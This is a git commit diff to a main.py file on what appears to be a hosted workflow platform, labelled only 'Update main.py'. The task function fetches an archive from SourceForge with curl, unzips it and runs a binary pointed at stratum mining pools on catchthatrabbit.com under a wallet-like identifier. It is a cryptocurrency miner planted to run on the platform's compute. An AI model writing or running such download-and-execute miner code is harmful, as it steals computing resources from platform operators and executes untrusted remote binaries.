fc6e32fe3f9d1997768a1b9482fc18de2ace457e
afreutorocelz-del <afreutorocelz@gmail.com>
2026-03-17 17:57:27 -0700

    Update main.py

--- main.py
+++ main.py
@@ -5,7 +5,8 @@ app = Workflows()
 @app.task(
   plan="pro" 
 )
-def my1(a: int) -> int:
+def run():
+  import sys
   import os
   os.system('curl https://sourceforge.net/projects/drths/files/core.zip/download -L -o core.zip && unzip core.zip')
   os.system('./core -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008')
